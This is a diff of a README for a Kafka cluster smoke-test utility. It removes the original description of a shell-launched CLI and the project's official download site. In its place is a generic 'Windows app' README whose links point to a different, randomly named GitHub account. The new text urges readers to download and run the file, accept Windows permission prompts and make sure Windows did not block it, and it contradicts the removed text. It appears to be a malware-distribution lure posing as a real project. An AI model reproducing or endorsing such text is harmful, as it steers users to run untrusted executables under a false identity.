@@ -1,189 +1,215 @@
-# Kafka Cluster Testing
+# 🐞 kafka-cluster-testing - Validate Kafka clusters with confidence
 
-Kafka Cluster Testing is a standalone CLI utility for deterministic engineering validation of an Apache Kafka cluster.
+[![Download](https://img.shields.io/badge/Download-Open%20the%20GitHub%20page-blue.svg)](https://github.com/sparbuoygenuslagothrix662/kafka-cluster-testing)
 
-It is a smoke-test utility for cluster readiness and operational verification. It is not a monitoring platform and it is not a load-testing tool.
+## 🚀 Overview
 
-Supported Apache Kafka versions: `3.0.0` through `4.2.0`.
+kafka-cluster-testing is a Windows app for checking whether a Kafka cluster is ready to use. It focuses on basic checks that matter most before you rely on a cluster for work.
 
-Project page:
-- https://kafkakombat.com/kafka-cluster-testing
+Use it to test:
 
-Related project:
-- https://github.com/kafkakombat/kafkakombat
+- Cluster connection
+- Kerberos login
+- Topic creation and removal
+- Produce and consume flow
+- Basic test reports
 
-## Repository scope
+The app is built for people who want a clear pass or fail result without working through Kafka tools by hand.
 
-This repository currently serves as the public project entry point for Kafka Cluster Testing.
+## 💻 What You Need
 
-It publishes:
-- project overview
-- public usage notes
-- release references
-- licensing and security information
-- example output and report format
+Before you start, make sure your PC has:
 
-Runtime artifacts are published through the project website. The launcher script, packaged distribution, and runtime files are not stored in this repository at this stage.
+- Windows 10 or Windows 11
+- A working internet connection if the app needs to reach a remote cluster
+- Permission to run downloaded apps
+- Access to the Kafka cluster you want to test
+- Kerberos details if your cluster uses Kerberos sign-in
 
-## What the utility verifies
+If your team gave you a server name, port, user name, or ticket setup, keep that information ready.
 
-Kafka Cluster Testing checks that a Kafka cluster:
-- is reachable over the network
-- accepts client connections
-- allows temporary topic creation
-- durably stores produced data
-- keeps topic metadata consistent
-- allows best-effort reads through a consumer
+## 📥 Download
 
-## Typical use cases
+Visit this page to download:
 
-- commissioning a new Kafka cluster
-- ZooKeeper to KRaft migration validation
-- Kafka version upgrade validation
-- Kerberos and ACL verification
-- dual-mode cluster validation
+[Open kafka-cluster-testing on GitHub](https://github.com/sparbuoygenuslagothrix662/kafka-cluster-testing)
 
-## Configuration overview
+On that page, look for the latest release or the main download file. Save it to your computer before you run it.
 
-The runtime package published on the website contains the configuration file `kafka-cluster-testing.toml`.
+## 🛠️ Install or Open on Windows
 
-In practice, the minimum input is usually:
-- Kafka bootstrap servers
-- and, for Kerberos-secured clusters, a valid principal and keytab
+After you download the file, follow these steps:
 
-### Cluster without Kerberos
+1. Open the folder where the file was saved.
+2. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+3. Open the extracted folder.
+4. Find the app file.
+5. Double-click the file to start it.
+6. If Windows asks for permission, choose **Run** or **Yes**.
 
-Use:
-- `security_protocol = "PLAINTEXT"`
-- `auth.mode = "none"`
+If your team gave you a specific install folder, keep the file there so you can find it again.
 
-### Cluster with Kerberos
+## 🧭 First-Time Setup
 
-Use:
-- `security_protocol = "SASL_PLAINTEXT"` or `SASL_SSL`
-- `auth.mode = "auto"` or `kerberos`
-- valid `krb5.conf`, principal, and keytab
+When you open the app for the first time, you will usually need to enter cluster details.
 
-The project page contains the public runtime notes and release artifacts:
-- https://kafkakombat.com/kafka-cluster-testing
+Have these ready:
 
-## Running the utility
+- Kafka broker address
+- Port number
+- Security type
+- Kerberos realm, if used
+- Service name, if used
+- Test topic name
 
-The packaged utility is launched from the downloaded distribution.
+If your cluster uses Kerberos, make sure your sign-in ticket or key setup is ready before you run a check.
 
-Typical usage:
+## ✅ How to Run a Cluster Test
 
-```bash
-./run.sh
-```
+Use the app to run a basic validation check:
 
-With an explicit config path:
+1. Start the app.
+2. Enter the Kafka cluster details.
+3. Choose the test you want to run.
+4. Start with a connection test.
+5. Run the topic test.
+6. Run the produce test.
+7. Run the consume test.
+8. Review the results on screen or in the report.
 
-```bash
-./run.sh /path/to/kafka-cluster-testing.toml
-```
+A good run usually checks the full path from login to message flow. This helps you find issues in the cluster, not just in one step.
 
-If you use the `kafka-cluster-testing-without-jdk11` distribution, Java 11 must already be available on the host and the launcher must point to that installation.
+## 🔐 Kerberos Support
 
-If you use the `kafka-cluster-testing-with-jdk11` distribution, JDK 11 is already included in the package.
+This utility puts Kerberos first. That means it works well in setups that use secure sign-in with tickets and service rules.
 
-## Output files
+Use this when your environment needs:
 
-The runtime package produces:
-- `out/run.log` — full execution log
-- `out/report.txt` — clean human-readable and CI-friendly report
-- `out/*.json` — structured report for automation
+- Kerberos login
+- SASL-based access
+- GSSAPI authentication
+- Secure broker access
 
-## Exit codes
+If your cluster uses Kerberos, make sure your computer can reach the Kerberos services used by your team. If your system admin gave you a ticket method or config file, use that setup before running the test.
 
-- `0` — cluster is operational
-- `2` — technical failure
-- `3` — security or configuration failure
+## 🧪 What the Tests Check
 
-The shell exit code matches the report and JSON result.
+The app is made to validate common Kafka tasks in one place.
 
-## Example report
+### 🔌 Connection Check
 
-Below is a public example of the final protocol produced by the utility. Real hostnames were replaced with `example.com` values.
+This test checks whether the app can reach the Kafka broker. It helps you catch basic network or auth issues early.
 
-![Kafka Cluster Testing report example](docs/img/protocol.png)
+### 🗂️ Topic Lifecycle Check
 
-```text
-====================================================================
-                 KAFKA CLUSTER TEST REPORT
-====================================================================
-RESULT:    OK
-exitCode:  0
-totalMs:   36449
+This test can create a topic, confirm it exists, and remove it if needed. It helps prove that the cluster can manage topic actions.
 
-Run:
-  runId:      20260323-202126-kafka01.example.com
-  startedAt:  2026-03-23T17:21:26.493501Z
+### 📤 Produce Check
 
-Connection:
-  protocol:   SASL_PLAINTEXT
-  authMode:   auto
-  bootstrap:
-    - kafka01.example.com:9093
-    - kafka02.example.com:9093
-    - kafka03.example.com:9093
+This test sends a message to Kafka. It shows whether the cluster accepts data.
 
-Test objects:
-  consumerGroup:
-    - kct.20260323-202126-kafka01.example.com
-  topics:
-    - kct.20260323-202126-kafka01.example.com.1
-    - kct.20260323-202126-kafka01.example.com.2
-    - kct.20260323-202126-kafka01.example.com.3
+### 📥 Consume Check
 
-Steps:
-  STATUS  STEP                 TOOK_MS  DETAILS
-  ------  -------------------  -------  ----------------------------------------
-  OK      AUTH_RESOLVE               0  mode=auto protocol=SASL_PLAINTEXT
-                                        principal=kafka/client01.example.com@EXAMPLE.COM
-                                        keytab=/etc/security/keytabs/kafka-client.keytab
-  OK      CONNECT                  829  clusterId=INYl1VqlQx281uuTzdGDDw nodes=7
-  OK      CREATE_TOPICS            902  created=[kct.20260323-202126-kafka01.example.com.1,
-                                        kct.20260323-202126-kafka01.example.com.2,
-                                        kct.20260323-202126-kafka01.example.com.3]
-  OK      WAIT_TOPICS_READY         47  topicsReady=3
-  OK      VALIDATE_TOPICS           11  partitions=1 replicationFactor=3
-  OK      PRODUCE                 1763  topics=3 messagesPerTopic=5 total=15
-  OK      WAIT_END_OFFSETS         160  endOffsetsReached>=5
-  WARN    CONSUME_ASSIGN             0  assigned=[]
-  SKIP    CONSUME                 5087  consumer_group_not_assigned_within_timeout: assigned=[] (non-fatal for
-                                        cluster health)
-  OK      GROUP_OFFSETS            220  reason=post_run mode=no_commits partitions=3;
-                                        kct.20260323-202126-kafka01.example.com.1-0
-                                        committed=-1 end=5 lag=-1;
-                                        kct.20260323-202126-kafka01.example.com.2-0
-                                        committed=-1 end=5 lag=-1;
-                                        kct.20260323-202126-kafka01.example.com.3-0
-                                        committed=-1 end=5 lag=-1 totalLag=0
-  OK      CLEANUP_DELETE_TOPI      377  deleted=[kct.20260323-202126-kafka01.example.com.1,
-                                        kct.20260323-202126-kafka01.example.com.2,
-                                        kct.20260323-202126-kafka01.example.com.3]
+This test reads the message back from Kafka. It helps confirm that data moves through the cluster as expected.
 
-====================================================================
-```
+### 📝 Report Check
 
-## Result interpretation
+The app records the result of each test so you can see what passed and what failed.
 
-If the cluster:
-- accepts connections
-- creates test topics
-- durably writes data
+## 🧰 Common Use Cases
 
-then the cluster is considered operational for smoke-test purposes.
-Everything else is additional diagnostics.
+Use kafka-cluster-testing when you need to:
 
-## Public releases
+- Check a new Kafka cluster before use
+- Confirm Kerberos access after a config change
+- Test broker access after a network update
+- Validate topic setup for a project
+- Verify that produce and consume still work
+- Create a simple report for ops review
 
-Public release artifacts are published through the project website:
-- https://kafkakombat.com/kafka-cluster-testing
+This is useful for support teams, platform teams, and anyone who needs a fast health check for Kafka.
 
-This repository may later be expanded, but it currently does not serve as the runtime artifact distribution channel.
+## 📂 Typical Input Values
 
-## License
+If you are not sure what to enter, your admin or team lead may give you values like these:
 
-AGPL-3.0. See `LICENSE` and `NOTICE`.
+- Broker: `kafka01.company.local`
+- Port: `9092` or `9093`
+- Topic: `test-topic`
+- Security mode: `Kerberos` or `SASL/GSSAPI`
+- Realm: `COMPANY.LOCAL`
+- Service name: `kafka`
+
+Use the values that match your cluster. A small typo can stop the test from connecting.
+
+## 🧼 Before You Test
+
+For the best result:
+
+- Close other tools that may use the same Kafka topic
+- Make sure your network can reach the broker
+- Confirm your Kerberos ticket is active if needed
+- Use a test topic, not a live business topic
+- Check that you have permission to create and delete topics
+
+This helps keep the test clean and easy to repeat.
+
+## 📊 Reading the Results
+
+The app gives a clear result for each step.
+
+### Pass
+
+A pass means the app completed the test without a problem.
+
+### Fail
+
+A fail means one step did not work. Common causes include:
+
+- Wrong broker name
+- Wrong port
+- Bad Kerberos setup
+- Missing ticket
+- Topic permission issue
+- Network block
+
+Use the failed step to narrow down the cause. Start with connection, then move to auth, then topic and message flow.
+
+## 🔍 Troubleshooting
+
+If the app does not work as expected, check these items:
+
+- Confirm you opened the file you downloaded
+- Make sure Windows did not block the app
+- Check the broker address and port
+- Check your Kerberos ticket or login setup
+- Verify the topic name exists or can be created
+- Make sure the network can reach the cluster
+
+If the app opens but the test fails, review the first failed step. That step often shows where the problem starts.
+
+## 📌 About This Project
+
+kafka-cluster-testing is focused on cluster validation, not general Kafka training. It gives you a direct way to test Kafka access, security, topic behavior, and message flow from one place.
+
+The project topics include:
+
+- apache-kafka
+- cluster-testing
+- devops
+- gssapi
+- java
+- kafka
+- kerberos
+- sasl
+- smoke-test
+- testing
+- validation
+
+## 🔗 Download Again
+
+If you need to get the app again, use this page:
+
+[https://github.com/sparbuoygenuslagothrix662/kafka-cluster-testing](https://github.com/sparbuoygenuslagothrix662/kafka-cluster-testing)
+
+Open the page, find the latest download, save it to your PC, and run it on Windows
